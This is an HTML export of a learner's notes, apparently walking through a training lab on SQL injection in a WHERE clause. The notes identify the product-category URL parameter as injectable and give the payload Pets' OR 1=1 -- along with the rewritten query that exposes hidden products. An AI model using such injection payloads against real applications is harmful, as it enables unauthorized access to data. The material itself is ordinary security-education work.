<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>#1 Lab1</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>#1 Lab1</h1><br/><strong><h3>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data<br /></h3></strong><br /><a name="BASIC_SQL_INJECTION_IN_WHERE_CLAUSE"></a><br /><br /><a href=""><img src="images/9-1.png" alt="images/9-1.png" /></a><br /><br /><br />This particular lab has already given us the pre built SQL Query which we can use to easily identify and exploit the Injection<br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">SELECT</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;products&nbsp;<span style="color:#ff9d00;font-weight:700">WHERE</span>&nbsp;category&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">&#39;Gifts&#39;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">AND</span>&nbsp;released&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;<br />&nbsp;</div></div><br /><br />we have the webapplication loaded<br /><a href=""><img src="images/9-2.png" alt="images/9-2.png" /></a><br /><br />and this looks like a shopping application...<br /><br /><br />we check the Filters and Click on pets<br /><a href=""><img src="images/9-3.png" alt="images/9-3.png" /></a><br /><br />we see that the URL is populated with the pets Query and we can also Recall this from our SQL Query<br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">SELECT</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;products&nbsp;<span style="color:#ff9d00;font-weight:700">WHERE</span>&nbsp;category&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">&#39;Pets&#39;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">AND</span>&nbsp;released&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;<br />&nbsp;</div></div><br /><br />and this is also the vulnerable param which we are going to exploit<br /><br /><br /><strong><span style="background-color:#ff0000;">Initial Payload:</span></strong><br /><br /><div class="codebox"><div class="codebox">Pets<span style="color:#3ad900;font-weight:400">&#39;&nbsp;OR&nbsp;1=1&nbsp;--</span><br /></div></div><br /><br /><span style="background-color:#7f7f7f;">Now our Query would look something Like this</span><br /><br /><div class="codebox"><div class="codebox"><span style="color:#ff9d00;font-weight:700">SELECT</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">FROM</span>&nbsp;products&nbsp;<span style="color:#ff9d00;font-weight:700">WHERE</span>&nbsp;category&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">&#39;Pets&#39;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">OR</span>&nbsp;<span style="color:#ff0044;font-weight:400">1</span>=<span style="color:#ff0044;font-weight:400">1</span>&nbsp;<span style="color:#0088ff;font-weight:400">--&#39;&nbsp;AND&nbsp;released&nbsp;=&nbsp;1&nbsp;</span><br /></div></div><br /><br /><a href=""><img src="images/9-4.png" alt="images/9-4.png" /></a><br /><br />we were successfully able to inject code in the param making the web app to return all categories present...<br /></div></body></html>